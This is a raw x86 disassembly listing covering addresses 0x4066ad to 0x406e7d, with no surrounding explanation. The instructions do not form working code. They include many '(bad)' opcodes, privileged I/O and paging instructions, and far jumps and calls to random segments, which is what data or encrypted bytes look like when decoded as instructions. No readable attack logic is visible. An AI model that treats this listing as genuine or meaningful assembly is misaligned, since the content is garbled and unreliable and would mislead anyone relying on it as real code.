  4066ad:	push   0xc6ee4b74
  4066b2:	and    BYTE PTR [edi-0x35],ch
  4066b5:	or     al,0x49
  4066b7:	jge    0x406679
  4066b9:	pushf  
  4066ba:	pop    edi
  4066bb:	stc    
  4066bc:	(bad)  
  4066bd:	invlpg BYTE PTR [ecx+0x36cd43eb]
  4066c4:	mov    ecx,0x769a9eb2
  4066c9:	cmp    al,0xd
  4066cb:	sub    eax,0xa963f77
  4066d0:	xchg   edi,eax
  4066d1:	aam    0xe4
  4066d3:	rcl    BYTE PTR [eax+0x2d7d842e],1
  4066d9:	std    
  4066da:	push   0x61
  4066dc:	push   ebx
  4066dd:	sub    BYTE PTR [ebx+0x5accf431],al
  4066e3:	push   0x4e453cb1
  4066e8:	into   
  4066e9:	and    eax,0x663e7fd2
  4066ee:	fild   QWORD PTR gs:[ebx]
  4066f1:	inc    eax
  4066f2:	jo     0x4066fc
  4066f4:	add    al,0x4a
  4066f6:	rol    BYTE PTR [eax+0x44121a8],1
  4066fc:	or     BYTE PTR [ebp-0x31a7709],cl
  406702:	out    0xfd,eax
  406704:	in     eax,0x2b
  406706:	mov    edx,0x6e71a785
  40670b:	fstp   QWORD PTR ds:0x1244c4f8
  406711:	loope  0x4066ea
  406713:	(bad)  
  406714:	std    
  406715:	outs   dx,DWORD PTR ds:[esi]
  406716:	jnp    0x4066c9
  406718:	shl    edx,cl
  40671a:	xchg   ecx,eax
  40671b:	dec    edi
  40671c:	adc    ah,cl
  40671e:	xchg   esp,eax
  40671f:	mov    eax,ds:0x2cb1225a
  406724:	and    eax,0x8046dff7
  406729:	out    0xb,eax
  40672b:	xlat   BYTE PTR ds:[ebx]
  40672c:	sbb    DWORD PTR [edx+0x5f],esp
  40672f:	cwde   
  406730:	clc    
  406731:	xchg   esi,eax
  406732:	fldenv [eax]
  406734:	shl    DWORD PTR [ecx+0x13],cl
  406737:	dec    ebp
  406738:	push   0xffffff9f
  40673a:	mov    ebp,0x5acf2f17
  40673f:	cli    
  406740:	call   0xc64:0x2e3b9b59
  406747:	or     ah,BYTE PTR [esi-0x222ded72]
  40674d:	aad    0xa3
  40674f:	dec    eax
  406750:	add    eax,eax
  406752:	or     edx,ebx
  406754:	mov    al,0x40
  406756:	pop    edx
  406757:	mov    edx,0xf6f80472
  40675c:	jo     0x4067c7
  40675e:	push   ebx
  40675f:	sbb    ebp,ecx
  406761:	adc    esp,DWORD PTR [ebx+0x24]
  406764:	loopne 0x406772
  406766:	or     eax,0x68bca1b3
  40676b:	loope  0x406730
  40676d:	jg     0x4067d1
  40676f:	fdiv   st(7),st
  406771:	lods   eax,DWORD PTR ds:[esi]
  406772:	js     0x406766
  406774:	sar    DWORD PTR [ebx+0x36],1
  406777:	xor    ch,BYTE PTR [edi]
  406779:	cmc    
  40677a:	cwde   
  40677b:	jmp    0x7ed3:0xb4ba45e5
  406782:	data16 mov ch,0xf6
  406785:	cwde   
  406786:	ret    
  406787:	xor    eax,0x5748fd95
  40678c:	cmp    eax,0x916bfc9c
  406791:	push   esi
  406792:	mov    DWORD PTR [eax],edx
  406794:	fidiv  DWORD PTR [edi-0x6b]
  406797:	sub    ah,dh
  406799:	je     0x40678a
  40679b:	into   
  40679c:	stos   DWORD PTR es:[edi],eax
  40679d:	cmp    eax,0x7de1f6c1
  4067a2:	mov    al,0x61
  4067a4:	xlat   BYTE PTR ds:[ebx]
  4067a5:	es pop esp
  4067a7:	push   eax
  4067a8:	scas   eax,DWORD PTR es:[edi]
  4067a9:	sbb    ebx,DWORD PTR [ecx+0x0]
  4067ac:	and    eax,0xdd102
  4067b1:	fadd   DWORD PTR [ebx-0x47]
  4067b4:	push   edx
  4067b5:	enter  0x321,0x5
  4067b9:	push   0xe
  4067bb:	pop    eax
  4067bc:	push   ebp
  4067bd:	pop    esp
  4067be:	rol    BYTE PTR [eax+0x30],1
  4067c1:	cli    
  4067c2:	aaa    
  4067c3:	aam    0x7b
  4067c5:	lea    edi,[esi+0x46]
  4067c8:	or     DWORD PTR [ebp+0xcfd685f],ecx
  4067ce:	mov    DWORD PTR [ebp+0x29],ebx
  4067d1:	shl    DWORD PTR [edi],1
  4067d3:	rcr    DWORD PTR [eax+0x21698668],1
  4067d9:	and    ch,0x37
  4067dc:	bound  ecx,QWORD PTR ds:0xdc92142a
  4067e2:	mov    al,ds:0x5f46ed9e
  4067e7:	push   es
  4067e8:	out    dx,eax
  4067e9:	xchg   BYTE PTR [ecx+edx*8-0x7d7782f0],dh
  4067f0:	bound  edi,QWORD PTR [ebx]
  4067f2:	xor    edi,DWORD PTR [ebx]
  4067f4:	nop
  4067f5:	mov    al,0xa9
  4067f7:	ja     0x406866
  4067f9:	in     al,dx
  4067fa:	push   0xffffffc9
  4067fc:	rcl    DWORD PTR ds:0x6954678f,0x9e
  406803:	gs jecxz 0x40681b
  406806:	mov    eax,ds:0x7bd2ab69
  40680b:	fs xchg ecx,eax
  40680d:	inc    edi
  40680e:	fucomip st,st(6)
  406810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406811:	repnz sbb ch,BYTE PTR [esi-0x62]
  406815:	lods   eax,DWORD PTR ds:[esi]
  406816:	test   DWORD PTR [eax],edx
  406818:	sub    eax,0x5f28b2b7
  40681d:	and    eax,0xd4b1b224
  406822:	shl    BYTE PTR [edx-0x35],1
  406825:	xchg   BYTE PTR [edx+0x59d41a7e],bh
  40682b:	cmp    DWORD PTR [esi+0x64bf440e],esp
  406831:	test   BYTE PTR [ecx],cl
  406833:	sub    bh,BYTE PTR [ebx+0x51]
  406836:	dec    edi
  406837:	pop    edi
  406838:	mov    bl,0x3
  40683a:	sbb    eax,0x9d97934
  40683f:	retf   0x6c4b
  406842:	mov    edi,DWORD PTR [ebx+0xe]
  406845:	add    eax,0xa2a337a9
  40684a:	aaa    
  40684b:	in     al,dx
  40684c:	cmc    
  40684d:	push   esp
  40684e:	adc    eax,0x35c1d1e8
  406853:	call   0x4e53b16b
  406858:	in     al,0xca
  40685a:	cmc    
  40685b:	rol    ah,0x6b
  40685e:	addr16 xchg esi,eax
  406860:	mov    BYTE PTR [eax+0x33],al
  406863:	and    eax,0x8f98ec4c
  406868:	sub    eax,0x90380723
  40686d:	jmp    0x7a72:0x5d9584f4
  406874:	out    dx,al
  406875:	in     eax,dx
  406876:	xor    esp,0xffffff94
  406879:	(bad)  
  40687a:	xor    DWORD PTR [ebx+esi*4-0x133b7d82],edi
  406881:	ret    0x2ab2
  406884:	imul   ebp,DWORD PTR [ecx+0x5],0x94cf5e0d
  40688b:	and    ch,BYTE PTR [ebx]
  40688d:	push   ss
  40688e:	jp     0x40690b
  406890:	in     al,dx
  406891:	fadd   QWORD PTR [eax+0x4f4fa6db]
  406897:	loope  0x4068c6
  406899:	jp     0x406851
  40689b:	sti    
  40689c:	or     al,0xc9
  40689e:	inc    eax
  40689f:	jle    0x4068d7
  4068a1:	mov    ecx,0xf01ad13d
  4068a6:	sbb    dh,dl
  4068a8:	test   eax,esi
  4068aa:	adc    ah,bh
  4068ac:	push   ebx
  4068ad:	jns    0x406918
  4068af:	add    al,0x90
  4068b1:	inc    edx
  4068b2:	lds    eax,FWORD PTR [esi]
  4068b4:	dec    ebp
  4068b5:	inc    edx
  4068b6:	add    edx,DWORD PTR [eax+0x184cd33]
  4068bc:	retf   0x142c
  4068bf:	paddw  mm2,QWORD PTR [esi]
  4068c2:	stos   BYTE PTR es:[edi],al
  4068c3:	xor    BYTE PTR [ecx-0x8],dh
  4068c6:	js     0x40688a
  4068c8:	inc    ebx
  4068c9:	aas    
  4068ca:	inc    esp
  4068cb:	jecxz  0x40688d
  4068cd:	jmp    0x6e3c916f
  4068d2:	call   0x6f354c9d
  4068d7:	fcom   DWORD PTR [ecx-0x2acd4f0b]
  4068dd:	mov    ebp,0x688da4ab
  4068e2:	push   esp
  4068e3:	add    eax,0x4955faf5
  4068e8:	scas   eax,DWORD PTR es:[edi]
  4068e9:	out    dx,al
  4068ea:	fdivrp st(4),st
  4068ec:	or     BYTE PTR ds:0xfcd44556,ah
  4068f2:	add    al,0x38
  4068f4:	push   0x75ac0f71
  4068f9:	sbb    edi,DWORD PTR [edx-0x6f0ca09d]
  4068ff:	pusha  
  406900:	push   ebx
  406901:	and    esi,esp
  406903:	inc    ebp
  406904:	test   DWORD PTR [edi],0x3b02b2ea
  40690a:	je     0x4068b3
  40690c:	cld    
  40690d:	mov    ebp,0xafa95b77
  406912:	scas   eax,DWORD PTR es:[edi]
  406913:	mov    BYTE PTR [eax+0x5b],al
  406916:	iret   
  406917:	mov    al,0x68
  406919:	call   0xb03cc415
  40691e:	cdq    
  40691f:	xchg   ebx,eax
  406920:	fcom   QWORD PTR [eax]
  406922:	pop    esi
  406923:	daa    
  406924:	jecxz  0x4068ea
  406926:	stc    
  406927:	ss (bad) 
  406929:	out    dx,al
  40692a:	test   al,0x5e
  40692c:	les    ebp,FWORD PTR [ecx]
  40692e:	xor    eax,0xbca2b4ba
  406933:	aam    0xa8
  406935:	(bad)  
  406936:	jecxz  0x406920
  406938:	push   ss
  406939:	jle    0x406916
  40693b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40693c:	fs add eax,0xfa3bc07b
  406942:	pop    edx
  406943:	popa   
  406944:	out    0x3,al
  406946:	int3   
  406947:	xchg   DWORD PTR [ebx+eax*8-0x701629da],ebx
  40694e:	bound  eax,QWORD PTR [ebx]
  406950:	push   ebp
  406951:	sbb    al,0x75
  406953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406954:	(bad)  
  406955:	fdivp  st(5),st
  406957:	sub    ah,ch
  406959:	stos   BYTE PTR es:[edi],al
  40695a:	push   ebp
  40695b:	scas   eax,DWORD PTR es:[edi]
  40695c:	(bad)  
  40695d:	push   eax
  40695e:	and    bl,BYTE PTR [ecx-0x6c183edd]
  406964:	sahf   
  406965:	cld    
  406966:	inc    eax
  406967:	in     eax,0x48
  406969:	sbb    al,BYTE PTR [ecx]
  40696b:	dec    ebx
  40696c:	mov    WORD PTR [ecx],cs
  40696e:	sub    al,0x65
  406970:	mov    ecx,0xf69e9eba
  406975:	xor    esi,DWORD PTR [ecx]
  406977:	ins    BYTE PTR es:[edi],dx
  406978:	in     eax,dx
  406979:	jecxz  0x4069c9
  40697b:	cwde   
  40697c:	push   eax
  40697d:	pop    es
  40697e:	sbb    ebx,eax
  406980:	shl    dl,0xdc
  406983:	pop    edi
  406984:	lahf   
  406985:	daa    
  406986:	cmp    eax,0x83dca83a
  40698b:	add    BYTE PTR [ebp+0x3910df2b],0x21
  406992:	sub    al,0xcd
  406994:	jbe    0x4069f0
  406996:	int    0xa3
  406998:	lods   eax,DWORD PTR ds:[esi]
  406999:	std    
  40699a:	mov    dh,BYTE PTR [eax+0x33]
  40699d:	sbb    ah,al
  40699f:	xchg   DWORD PTR [edi+ebp*2-0x6f],eax
  4069a3:	(bad)  [ebx-0x3fb2a9c]
  4069a9:	pop    ecx
  4069aa:	ror    BYTE PTR [edx],cl
  4069ac:	fnstsw WORD PTR [edi+0x64325f75]
  4069b2:	pop    ds
  4069b3:	aam    0x31
  4069b5:	lock pop eax
  4069b7:	es pop ds
  4069b9:	dec    eax
  4069ba:	test   DWORD PTR [ecx+ebp*8],ebx
  4069bd:	mov    gs,esi
  4069bf:	inc    ebp
  4069c0:	in     eax,0xe0
  4069c2:	nop
  4069c3:	hlt    
  4069c4:	lock xchg edx,eax
  4069c6:	pop    esi
  4069c7:	test   BYTE PTR [ecx-0x53064460],dh
  4069cd:	push   esp
  4069ce:	iret   
  4069cf:	test   ah,bh
  4069d1:	daa    
  4069d2:	xchg   esp,eax
  4069d3:	loop   0x4069e1
  4069d5:	mov    ds:0x8b491a8b,eax
  4069da:	xchg   ebx,eax
  4069db:	fiadd  WORD PTR [ebx+0x1c]
  4069de:	jle    0x4069c1
  4069e0:	xchg   ch,ch
  4069e2:	mov    ecx,0x82b9ae8c
  4069e7:	xor    BYTE PTR [edx],ch
  4069e9:	sub    BYTE PTR [ebx],ch
  4069eb:	cld    
  4069ec:	loopne 0x406983
  4069ee:	scas   eax,DWORD PTR es:[edi]
  4069ef:	test   DWORD PTR [edi-0x6f],edx
  4069f2:	in     al,0xa3
  4069f4:	cmp    cl,BYTE PTR [ecx]
  4069f6:	mov    dh,0x12
  4069f8:	pop    ds
  4069f9:	and    ebx,ebx
  4069fb:	mov    edx,DWORD PTR [esi+0x1]
  4069fe:	pop    ss
  4069ff:	mov    edx,0x76080d9
  406a04:	in     eax,dx
  406a05:	jge    0x4069ec
  406a07:	xchg   esp,eax
  406a08:	cmc    
  406a09:	cli    
  406a0a:	pop    ss
  406a0b:	test   eax,0x3df5be13
  406a10:	icebp  
  406a11:	pushf  
  406a12:	add    eax,0x41a85fd6
  406a17:	fld    TBYTE PTR [edi-0xc6cb34e]
  406a1d:	xchg   ebp,eax
  406a1e:	out    dx,al
  406a1f:	mov    esi,0xd7f226b7
  406a24:	push   esp
  406a25:	das    
  406a26:	out    0xb9,eax
  406a28:	pop    ecx
  406a29:	cmp    eax,0xbf710fcc
  406a2e:	lods   al,BYTE PTR ds:[esi]
  406a2f:	fist   WORD PTR [edi]
  406a31:	ror    DWORD PTR [edx],0x8a
  406a34:	adc    edi,DWORD PTR [eax-0x53d09795]
  406a3a:	xor    al,0xb8
  406a3c:	xchg   esi,eax
  406a3d:	ja     0x406a7a
  406a3f:	scas   eax,DWORD PTR es:[edi]
  406a40:	imul   esi,DWORD PTR [edx],0x858156a8
  406a46:	pop    edi
  406a47:	int    0xe9
  406a49:	mov    ebp,0x2607a03e
  406a4e:	push   edx
  406a4f:	push   edi
  406a50:	pop    ss
  406a51:	xor    DWORD PTR [ebx+0x40],ecx
  406a54:	or     al,BYTE PTR [eax+0x354f0f3b]
  406a5a:	jmp    0x4f55:0xdde1e0ed
  406a61:	int    0x28
  406a63:	or     esp,DWORD PTR [ecx+edx*8-0x5e98a46f]
  406a6a:	cld    
  406a6b:	sub    eax,0x74c3df9
  406a70:	je     0x406a46
  406a72:	fmul   QWORD PTR [edx+0x4f57011]
  406a78:	js     0x406acd
  406a7a:	jnp    0x406aba
  406a7c:	push   ds
  406a7d:	jno    0x406ab3
  406a7f:	xor    bl,dl
  406a81:	push   esp
  406a82:	cmp    al,0x84
  406a84:	outs   dx,BYTE PTR ds:[esi]
  406a85:	hlt    
  406a86:	lds    edx,FWORD PTR [ebx-0x2c676836]
  406a8c:	inc    ebx
  406a8d:	add    ah,BYTE PTR ds:0x6bb52b5c
  406a93:	lea    ebp,[di-0x4df1]
  406a98:	mov    WORD PTR [edx-0x3f],ds
  406a9b:	icebp  
  406a9c:	mov    ebp,0xe4245621
  406aa1:	iret   
  406aa2:	jo     0x406aed
  406aa4:	lods   eax,DWORD PTR ds:[esi]
  406aa5:	rcr    ecx,cl
  406aa7:	stos   BYTE PTR es:[edi],al
  406aa8:	pop    eax
  406aa9:	fistp  DWORD PTR [ecx-0x43]
  406aac:	in     al,dx
  406aad:	sub    eax,0xddb2e66b
  406ab2:	cs push ebp
  406ab4:	jmp    0x406a9f
  406ab6:	repz int3 
  406ab8:	xchg   ebx,eax
  406ab9:	call   0x5169:0xefe85754
  406ac0:	push   es
  406ac1:	cmp    al,0x8d
  406ac3:	add    eax,0xe9d7bde7
  406ac8:	jle    0x406af1
  406aca:	adc    eax,0x55903bf7
  406acf:	inc    esi
  406ad0:	ficom  DWORD PTR [edi+0x653027d1]
  406ad6:	xchg   ecx,eax
  406ad7:	mov    ah,0x1d
  406ad9:	cs xchg ebp,eax
  406adb:	stos   BYTE PTR es:[edi],al
  406adc:	and    eax,0xe098c130
  406ae1:	int    0x94
  406ae3:	push   esi
  406ae4:	sbb    DWORD PTR [edi],0x74cb04a0
  406aea:	jne    0x406ae3
  406aec:	mov    esp,0x9ea1b261
  406af1:	inc    edx
  406af2:	dec    ebp
  406af3:	and    bh,BYTE PTR [edi+0x69]
  406af6:	push   es
  406af7:	rcl    DWORD PTR [eax],cl
  406af9:	adc    eax,esi
  406afb:	in     eax,dx
  406afc:	jns    0x406a80
  406afe:	inc    ecx
  406aff:	pushf  
  406b00:	inc    esp
  406b01:	jae    0x406b6a
  406b03:	mov    eax,0xd7308040
  406b08:	inc    ebp
  406b09:	mov    al,ah
  406b0b:	mov    ds:0x54733892,eax
  406b10:	arpl   dx,bp
  406b12:	inc    edx
  406b13:	jno    0x406b49
  406b15:	jns    0x406b2c
  406b17:	inc    esp
  406b18:	xchg   edi,eax
  406b19:	cmp    eax,ebx
  406b1b:	mov    dh,0x43
  406b1d:	xchg   eax,eax
  406b1f:	popa   
  406b20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b21:	jns    0x406ac3
  406b23:	sub    esi,DWORD PTR [esi+ebp*8+0x3eb7cdc6]
  406b2a:	dec    ebx
  406b2b:	pop    ecx
  406b2c:	mov    eax,edi
  406b2e:	pop    eax
  406b2f:	mov    eax,0xca181059
  406b34:	or     al,0x69
  406b36:	arpl   WORD PTR [edi-0x3f1ba032],bx
  406b3c:	or     ecx,ebx
  406b3e:	jge    0x406b73
  406b40:	scas   al,BYTE PTR es:[edi]
  406b41:	xor    eax,0xca77284f
  406b46:	test   DWORD PTR [ecx-0x6],eax
  406b49:	inc    esp
  406b4a:	les    eax,FWORD PTR [edx+0x2b426cd5]
  406b50:	xlat   BYTE PTR ds:[ebx]
  406b51:	sbb    eax,0xe77f473d
  406b56:	ret    0xa9dd
  406b59:	out    0xf8,eax
  406b5b:	pop    ebx
  406b5c:	inc    ebp
  406b5d:	sbb    al,0x1f
  406b5f:	test   BYTE PTR [edi],al
  406b61:	jl     0x406b6c
  406b63:	push   ss
  406b64:	retf   
  406b65:	xor    BYTE PTR [edi],bh
  406b67:	(bad)  
  406b68:	cmp    al,0x97
  406b6a:	mov    eax,0x96354506
  406b6f:	push   ebx
  406b70:	mov    ebx,DWORD PTR [ebp+0x4a9203b0]
  406b76:	pop    ebp
  406b77:	shl    DWORD PTR [edx+0x3d5a6134],1
  406b7d:	(bad)  
  406b7e:	fst    DWORD PTR [edx]
  406b80:	pushf  
  406b81:	iret   
  406b82:	mov    al,ds:0xb136f690
  406b87:	shl    DWORD PTR [edi],1
  406b89:	ja     0x406bfa
  406b8b:	add    esi,ecx
  406b8d:	test   al,0x93
  406b8f:	xchg   DWORD PTR [esi],ebx
  406b91:	pop    es
  406b92:	push   esp
  406b93:	cmp    BYTE PTR [ecx+0x7b5df2cf],0x6a
  406b9a:	jae    0x406c07
  406b9c:	and    BYTE PTR [edx-0x7315fc2f],0xe1
  406ba3:	inc    edi
  406ba4:	adc    eax,0x95d19e12
  406ba9:	sbb    BYTE PTR [ebp+0xf],bl
  406bac:	outs   dx,BYTE PTR ds:[esi]
  406bad:	sti    
  406bae:	stos   DWORD PTR es:[edi],eax
  406baf:	fidivr WORD PTR [eax+0x258d3a76]
  406bb5:	jno    0x406c19
  406bb7:	sub    eax,0x6c9709e0
  406bbc:	and    bl,al
  406bbe:	mov    ds:0xd5c15291,al
  406bc3:	(bad)  
  406bc4:	jmp    0x406b7d
  406bc6:	cmp    BYTE PTR [esi-0x58],bl
  406bc9:	xor    ebp,DWORD PTR [edi+0x547e9c59]
  406bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bd0:	in     eax,dx
  406bd1:	xor    al,0x34
  406bd3:	(bad)  [ecx-0x62]
  406bd6:	mov    esi,edx
  406bd8:	icebp  
  406bd9:	xor    BYTE PTR [edx+0x3ef63665],0xf5
  406be0:	sbb    bh,BYTE PTR [ecx+0x6ffbc78]
  406be6:	mov    ?,WORD PTR [esi+ebp*1]
  406be9:	xchg   esi,eax
  406bea:	pop    ecx
  406beb:	div    BYTE PTR [edx-0x3b]
  406bee:	dec    edx
  406bef:	xor    BYTE PTR [ebp-0x72cd4f0d],ch
  406bf5:	mov    ebx,0xe8d5bb55
  406bfa:	neg    DWORD PTR [ebx-0x12b0a89f]
  406c00:	in     eax,0x94
  406c02:	in     eax,0xf5
  406c04:	dec    esp
  406c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c06:	jnp    0x406be7
  406c08:	or     DWORD PTR [ebx+0x409aacaf],ebp
  406c0e:	pop    edi
  406c0f:	repz test al,0x31
  406c12:	outs   dx,DWORD PTR ds:[esi]
  406c13:	scas   al,BYTE PTR es:[edi]
  406c14:	das    
  406c15:	mov    WORD PTR [eax],?
  406c17:	push   ss
  406c18:	add    ch,BYTE PTR [edx-0x5a]
  406c1b:	xchg   ecx,eax
  406c1c:	and    DWORD PTR [esi+0x17],ebx
  406c1f:	in     al,0xef
  406c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c22:	sub    al,0x20
  406c24:	cmp    edi,DWORD PTR [ecx-0x58079bf5]
  406c2a:	jle    0x406c06
  406c2c:	mov    ah,0x59
  406c2e:	pop    ebx
  406c2f:	cmp    cl,dl
  406c31:	ins    BYTE PTR es:[edi],dx
  406c32:	imul   esi,DWORD PTR [ebp-0x5a],0x67
  406c36:	dec    ecx
  406c37:	cmovbe ecx,edi
  406c3a:	aaa    
  406c3b:	mov    dh,0x9d
  406c3d:	mov    ds:0x24faa71c,eax
  406c42:	pusha  
  406c43:	adc    dh,dh
  406c45:	(bad)
  406c4a:	out    0xdb,al
  406c4c:	inc    esi
  406c4d:	sar    ebp,cl
  406c4f:	sahf   
  406c50:	or     eax,0xab327933
  406c55:	dec    esi
  406c56:	mov    ebx,0xfb552c8b
  406c5b:	inc    esi
  406c5c:	jp     0x406ccb
  406c5e:	mov    ebx,0xac683d1e
  406c63:	inc    ebp
  406c64:	(bad)  
  406c65:	fist   DWORD PTR [edx]
  406c67:	out    dx,eax
  406c68:	clc    
  406c69:	xchg   ecx,eax
  406c6a:	cmp    DWORD PTR [edi],edi
  406c6c:	sar    BYTE PTR [eax+0x6a],cl
  406c6f:	fstp   st(0)
  406c71:	push   0xffffffdd
  406c73:	mov    edx,0x81cad5d5
  406c78:	sbb    al,0x88
  406c7a:	iret   
  406c7b:	adc    BYTE PTR [eax-0x77],0xd9
  406c7f:	iret   
  406c80:	jmp    0x9a55:0xf8d54307
  406c87:	pop    es
  406c88:	dec    esp
  406c89:	dec    ebx
  406c8a:	ror    bl,0x1a
  406c8d:	xor    eax,0xbed5bcb1
  406c92:	scas   eax,DWORD PTR es:[edi]
  406c93:	xchg   ch,ch
  406c95:	test   BYTE PTR [eax-0x1d],dl
  406c98:	sar    BYTE PTR [esi+0x3a],0xfb
  406c9c:	nop
  406c9d:	jns    0x406cf7
  406c9f:	mov    dh,0x4d
  406ca1:	dec    ebp
  406ca2:	pop    ecx
  406ca3:	xchg   BYTE PTR [ecx-0x75],cl
  406ca6:	sbb    BYTE PTR [edi+0x27],bl
  406ca9:	jbe    0x406c60
  406cab:	sbb    dh,BYTE PTR [ebx+eax*4+0x23b8d52c]
  406cb2:	and    al,0x14
  406cb4:	mov    dl,0xb4
  406cb6:	jmp    0x4ddd:0xd0c2ac50
  406cbd:	js     0x406d31
  406cbf:	data16 mov ah,0x71
  406cc2:	call   0x49b74f37
  406cc7:	ficomp WORD PTR [ecx-0x71]
  406cca:	cmp    ecx,edi
  406ccc:	loopne 0x406c5b
  406cce:	add    BYTE PTR [ebx+eax*1],dl
  406cd1:	pushf  
  406cd2:	lods   eax,DWORD PTR ds:[esi]
  406cd3:	cmp    DWORD PTR [edi+0xf3a7742],0x58a9a805
  406cdd:	dec    eax
  406cde:	pop    esi
  406cdf:	jmp    0x139d:0x39b216fd
  406ce6:	enter  0xf4d0,0xb9
  406cea:	dec    edi
  406ceb:	xchg   ebp,eax
  406cec:	mov    esi,0xed196868
  406cf1:	push   ecx
  406cf2:	inc    DWORD PTR [edi+0x433987dd]
  406cf8:	gs jmp 0xd103a450
  406cfe:	push   ebp
  406d00:	(bad)  
  406d01:	gs jo  0x406d6f
  406d04:	mov    BYTE PTR [ecx-0x4b],0xdd
  406d08:	pop    ss
  406d09:	jp     0x406d3e
  406d0b:	mov    edx,0x588f8101
  406d10:	and    bh,BYTE PTR [edx-0x69]
  406d13:	pop    esp
  406d14:	(bad)  
  406d15:	sub    DWORD PTR [ecx],esp
  406d17:	xor    DWORD PTR [ebx],eax
  406d19:	inc    ebx
  406d1a:	mov    ebx,0x3d1bd73
  406d1f:	sub    DWORD PTR [eax-0x27f0291f],ecx
  406d25:	jns    0x406cbb
  406d27:	cld    
  406d28:	xchg   dl,bl
  406d2a:	imul   ecx,DWORD PTR [edx-0x5db3287f],0xc6f51639
  406d34:	mov    edi,ebx
  406d36:	mov    ebp,DWORD PTR [eax+0x42f11b39]
  406d3c:	jecxz  0x406d99
  406d3e:	push   ebx
  406d3f:	repnz stc 
  406d41:	mov    eax,DWORD PTR [esi-0x6b359924]
  406d47:	pop    eax
  406d48:	call   0xc78dac1a
  406d4d:	sbb    eax,0xe0218803
  406d52:	clc    
  406d53:	adc    ebx,ebx
  406d55:	push   0xffffffa3
  406d57:	dec    esp
  406d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d5a:	aam    0xfd
  406d5c:	add    esi,DWORD PTR [eax-0x1c477c76]
  406d62:	mov    dh,0xcf
  406d64:	and    ebx,DWORD PTR [esp+ecx*8+0x15]
  406d68:	dec    edx
  406d69:	lahf   
  406d6a:	pop    ebx
  406d6b:	and    DWORD PTR [ecx],edi
  406d6d:	pop    ecx
  406d6e:	into   
  406d6f:	imul   eax,DWORD PTR [edi],0xffffffaa
  406d72:	rol    DWORD PTR [ebx-0x8],0xdc
  406d76:	iret   
  406d77:	retf   0x89cf
  406d7a:	test   edx,edx
  406d7c:	es jo  0x406d82
  406d7f:	aaa    
  406d80:	mov    esi,0xedc11373
  406d85:	popf   
  406d86:	inc    esp
  406d87:	dec    esp
  406d88:	rol    DWORD PTR [ebx],1
  406d8a:	xchg   ebx,eax
  406d8b:	inc    eax
  406d8c:	ret    
  406d8d:	inc    edi
  406d8e:	mov    ah,0x8
  406d90:	loope  0x406e08
  406d92:	data16 add ah,BYTE PTR [eax-0x79]
  406d96:	sbb    dl,BYTE PTR [edx+0x6f]
  406d99:	jne    0x406d27
  406d9b:	mov    ebp,0xa5cc2219
  406da0:	sub    edx,eax
  406da2:	retf   
  406da3:	mov    edi,0x517677e5
  406da8:	add    ch,ah
  406daa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dab:	add    dh,bh
  406dad:	(bad)  
  406dae:	mov    ebx,0x1b41bcb0
  406db3:	add    BYTE PTR [ebp+ebp*2-0x5b045aa6],0x24
  406dbb:	ret    
  406dbc:	stc    
  406dbd:	push   eax
  406dbe:	ret    
  406dbf:	xchg   edx,eax
  406dc0:	xlat   BYTE PTR ds:[ebx]
  406dc1:	aaa    
  406dc2:	xlat   BYTE PTR ds:[ebx]
  406dc3:	or     DWORD PTR [ebx-0x62716795],ecx
  406dc9:	or     ah,dl
  406dcb:	fstp   QWORD PTR [ebx+0x45]
  406dce:	jmp    0x9a1c91c0
  406dd3:	and    eax,0x2352adf8
  406dd8:	ss mov edx,0xeb3c9db4
  406dde:	jl     0x406d87
  406de0:	icebp  
  406de1:	cli    
  406de2:	pushf  
  406de3:	sahf   
  406de4:	aaa    
  406de5:	sar    BYTE PTR [ebp-0x2656695f],0xae
  406dec:	mov    esi,0x20964753
  406df1:	pop    edi
  406df2:	pop    ecx
  406df3:	mov    esi,DWORD PTR [edi]
  406df5:	xchg   DWORD PTR ds:0x32ff6418,eax
  406dfb:	in     eax,dx
  406dfc:	push   ebx
  406dfd:	jmp    DWORD PTR [esi+ecx*8]
  406e00:	jle    0x406e2d
  406e02:	adc    al,0x75
  406e04:	pop    ecx
  406e05:	jmp    0x3f36:0x3ab7256e
  406e0c:	rcl    BYTE PTR cs:[ebx-0x20],1
  406e10:	bound  esi,QWORD PTR [edx]
  406e12:	out    dx,al
  406e13:	sbb    bl,BYTE PTR [esi-0x24]
  406e16:	mov    cs,WORD PTR [ecx]
  406e18:	retf   0x21a1
  406e1b:	mov    ch,0x62
  406e1d:	pop    ds
  406e1e:	ret    
  406e1f:	icebp  
  406e20:	jno    0x406e75
  406e22:	jae    0x406e60
  406e24:	or     bl,BYTE PTR [ecx+eiz*4+0xc1e1d80]
  406e2b:	gs add eax,0xa572c91c
  406e31:	ret    0xe4fb
  406e34:	adc    dh,BYTE PTR [ebx+0x5404eea8]
  406e3a:	sbb    dl,BYTE PTR [esi]
  406e3c:	out    0x6b,eax
  406e3e:	dec    esi
  406e3f:	add    DWORD PTR [eax],esi
  406e41:	stos   BYTE PTR es:[edi],al
  406e42:	mov    bh,BYTE PTR [edx+eax*4+0x348f8a38]
  406e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e4a:	lods   al,BYTE PTR ds:[esi]
  406e4b:	in     al,0xb6
  406e4d:	xchg   DWORD PTR [ebp-0x4f579101],ebx
  406e53:	push   eax
  406e54:	aaa    
  406e55:	addr16 mov al,0x91
  406e58:	addr16 push ss
  406e5a:	aad    0xf7
  406e5c:	ins    DWORD PTR es:[edi],dx
  406e5d:	sti    
  406e5e:	or     al,0xbb
  406e60:	push   ebx
  406e61:	jb     0x406e96
  406e63:	mov    WORD PTR [edi],fs
  406e65:	push   ebx
  406e66:	sbb    al,0x54
  406e68:	fstp   TBYTE PTR [ebp*8-0x48ec756f]
  406e6f:	xlat   BYTE PTR ds:[ebx]
  406e70:	mov    dh,BYTE PTR ss:[ecx]
  406e73:	jle    0x406e1e
  406e75:	into   
  406e76:	mov    ebx,0xe75c62cf
  406e7b:	sub    al,bl
  406e7d:	into   
